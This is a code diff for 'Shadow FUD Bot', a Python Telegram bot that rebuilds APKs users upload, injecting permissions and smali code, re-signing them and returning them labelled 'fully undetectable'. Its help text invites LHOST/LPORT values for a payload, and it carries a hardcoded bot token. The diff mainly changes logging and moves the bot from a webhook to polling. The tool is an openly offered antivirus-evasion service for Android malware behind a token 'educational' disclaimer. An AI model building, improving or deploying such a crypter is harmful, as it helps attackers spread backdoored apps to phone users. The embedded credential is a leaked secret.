@@ -1,4 +1,3 @@
-# fud_bot_cloud.py
 import os
 import re
 import random
@@ -6,38 +5,42 @@ import string
 import hashlib
 import subprocess
 import shutil
-import zipfile
 import xml.etree.ElementTree as ET
 import tempfile
-import asyncio
+import logging
 from datetime import datetime
 from flask import Flask, request, jsonify
 import requests
-from telegram import Update, Bot
+from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+
+# ===== LOGGING =====
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
 # ===== CONFIG =====
 BOT_TOKEN = '8838240871:AAEyVHXgedkE_Y-sYdkbTBXqqPCv0j0N4O8'
-WEBHOOK_URL = 'https://your-app.kinsta.app/webhook'  # CHANGE THIS
-
-# ===== INIT =====
-app = Flask(__name__)
-bot = Bot(token=BOT_TOKEN)
+PORT = int(os.environ.get('PORT', 8000))
 
 # ===== HELPER FUNCTIONS =====
 def rand_str(n=8):
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))
 
 def fud_process(input_apk_path, original_name):
-    """Main FUD processing pipeline - uses system apktool"""
-    # Create temp directories
+    """Main FUD processing pipeline"""
     work_dir = tempfile.mkdtemp()
     output_dir = tempfile.mkdtemp()
     
     try:
-        # Step 1: Decode APK using system apktool
+        logger.info(f"Processing APK: {original_name}")
+        
+        # Step 1: Decode APK
         decode_cmd = ['apktool', 'd', input_apk_path, '-o', work_dir, '-f']
         subprocess.run(decode_cmd, capture_output=True, check=True)
+        logger.info("APK decoded successfully")
         
         # Step 2: Modify AndroidManifest.xml
         manifest_path = os.path.join(work_dir, 'AndroidManifest.xml')
@@ -53,10 +56,10 @@ def fud_process(input_apk_path, original_name):
             fake_perms = [
                 '<uses-permission android:name="android.permission.READ_LOGS"/>',
                 '<uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>',
-                '<uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>'
+                '<uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>',
+                '<uses-permission android:name="android.permission.GET_TASKS"/>'
             ]
             
-            # Insert before </manifest>
             insert_pos = content.find('</manifest>')
             if insert_pos != -1:
                 for perm in fake_perms:
@@ -64,6 +67,7 @@ def fud_process(input_apk_path, original_name):
             
             with open(manifest_path, 'w') as f:
                 f.write(content)
+            logger.info("Manifest obfuscated")
         
         # Step 3: Add fake smali code
         smali_dir = os.path.join(work_dir, 'smali')
@@ -75,24 +79,22 @@ def fud_process(input_apk_path, original_name):
                         with open(file_path, 'r') as f:
                             smali_content = f.read()
                         
-                        # Add dummy method
-                        if ';->onCreate' in smali_content:
+                        if ';->onCreate' in smali_content and 'return-void' in smali_content:
                             smali_content = smali_content.replace(
                                 'return-void',
-                                'return-void\n\n.method private dummyGuard()V\n    .locals 1\n    const-string v0, "FUD_ACTIVE"\n    return-void\n.end method'
+                                'return-void\n\n.method private fudGuard()V\n    .locals 1\n    const-string v0, "FUD_ACTIVE"\n    return-void\n.end method'
                             )
                             with open(file_path, 'w') as f:
                                 f.write(smali_content)
+            logger.info("Smali code patched")
         
         # Step 4: Rebuild APK
         rebuilt_apk = os.path.join(output_dir, f'rebuilt_{rand_str()}.apk')
         build_cmd = ['apktool', 'b', work_dir, '-o', rebuilt_apk]
         subprocess.run(build_cmd, capture_output=True, check=True)
+        logger.info("APK rebuilt")
         
-        # Step 5: Sign APK (using debug keystore)
-        signed_apk = os.path.join(output_dir, f'signed_{rand_str()}.apk')
-        
-        # Check if debug keystore exists, create if not
+        # Step 5: Sign APK
         debug_keystore = 'debug.keystore'
         if not os.path.exists(debug_keystore):
             subprocess.run([
@@ -106,9 +108,12 @@ def fud_process(input_apk_path, original_name):
                 '-storepass', 'android',
                 '-keypass', 'android'
             ], capture_output=True, check=True)
+            logger.info("Debug keystore created")
         
-        # Try apksigner first, fallback to jarsigner
+        signed_apk = os.path.join(output_dir, f'signed_{rand_str()}.apk')
+        
         try:
+            # Try apksigner
             subprocess.run([
                 'apksigner', 'sign',
                 '--ks', debug_keystore,
@@ -117,6 +122,7 @@ def fud_process(input_apk_path, original_name):
                 '--out', signed_apk,
                 rebuilt_apk
             ], capture_output=True, check=True)
+            logger.info("APK signed with apksigner")
         except:
             # Fallback to jarsigner
             subprocess.run([
@@ -129,15 +135,18 @@ def fud_process(input_apk_path, original_name):
                 rebuilt_apk, 'androiddebugkey'
             ], capture_output=True, check=True)
             signed_apk = rebuilt_apk
+            logger.info("APK signed with jarsigner")
         
         # Step 6: Finalize
         final_name = f"FUD_{original_name.replace('.apk', '')}_{rand_str()}.apk"
         final_path = os.path.join(output_dir, final_name)
         os.rename(signed_apk, final_path)
         
+        logger.info(f"FUD APK created: {final_name}")
         return final_path, final_name
         
     except Exception as e:
+        logger.error(f"Error in fud_process: {str(e)}")
         raise e
     finally:
         # Cleanup
@@ -149,19 +158,21 @@ def fud_process(input_apk_path, original_name):
 # ===== TELEGRAM HANDLERS =====
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🔥 **Shadow FUD Bot** 🔥\n\n"
+        "🔥 **Shadow FUD Bot Active** 🔥\n\n"
         "Send me any APK file and I'll make it FUD!\n"
         "Use /help for commands.\n\n"
-        "⚠️ **Disclaimer**: For educational/testing purposes only."
+        "⚠️ **Educational purposes only**"
     )
 
 async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "📌 **Commands:**\n"
         "/start - Start bot\n"
-        "/help - Show this\n"
-        "/fud LHOST:1.2.3.4 LPORT:4444 - Process APK with custom payload\n\n"
-        "Or just send any APK file."
+        "/help - Show this\n\n"
+        "**How to use:**\n"
+        "Just send any `.apk` file\n"
+        "Optional: Add `LHOST:1.2.3.4 LPORT:4444` in caption\n\n"
+        "Bot will return FUD version 🚀"
     )
 
 async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -169,11 +180,9 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not document:
         return
     
-    # Check if APK
     if not document.file_name or not document.file_name.endswith('.apk'):
         return
     
-    # Check caption for LHOST/LPORT (just for logging)
     caption = update.message.caption or ''
     lhost_match = re.search(r'LHOST[:=](\S+)', caption)
     lport_match = re.search(r'LPORT[:=](\d+)', caption)
@@ -185,44 +194,41 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         await update.message.reply_text("⚙️ Processing APK with FUD techniques...")
     
-    # Download APK
-    file = await context.bot.get_file(document.file_id)
-    input_path = f"/tmp/{document.file_name}"
-    await file.download_to_drive(input_path)
-    
     try:
-        # Process
+        file = await context.bot.get_file(document.file_id)
+        input_path = f"/tmp/{document.file_name}"
+        await file.download_to_drive(input_path)
+        
         final_path, final_name = fud_process(input_path, document.file_name)
         
-        # Send back
         await context.bot.send_document(
             chat_id=update.effective_chat.id,
             document=open(final_path, 'rb'),
             caption=f"✅ **FUD APK Ready!**\n📁 {final_name}\n🔑 SHA256: {hashlib.sha256(open(final_path,'rb').read()).hexdigest()[:16]}\n\n💀 Shadow Approved"
         )
         
-        # Cleanup
         os.remove(final_path)
         
     except Exception as e:
+        logger.error(f"Error handling APK: {str(e)}")
         await update.message.reply_text(f"❌ Error: {str(e)}")
 
-# ===== FLASK WEBHOOK =====
-@app.route('/webhook', methods=['POST'])
-async def webhook():
-    data = request.get_json()
-    if data:
-        update = Update.de_json(data, bot)
-        application.process_update(update)
-    return 'ok', 200
+# ===== FLASK SERVER FOR KINSTA =====
+app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return "🐱 Shadow FUD Bot is running!"
+    return "🐱 Shadow FUD Bot is running on Kinsta!"
+
+@app.route('/health')
+def health():
+    return "OK", 200
 
 # ===== MAIN =====
 if __name__ == '__main__':
-    # Setup application
+    logger.info("Starting Shadow FUD Bot...")
+    
+    # Create application
     application = Application.builder().token(BOT_TOKEN).build()
     
     # Add handlers
@@ -230,10 +236,8 @@ if __name__ == '__main__':
     application.add_handler(CommandHandler('help', help_cmd))
     application.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
     
-    # Set webhook
-    application.run_webhook(
-        listen='0.0.0.0',
-        port=8000,
-        url_path='webhook',
-        webhook_url=WEBHOOK_URL
-    )
+    # Start bot in polling mode (runs in background)
+    application.run_polling()
+    
+    # Flask app for Kinsta health checks
+    app.run(host='0.0.0.0', port=PORT)
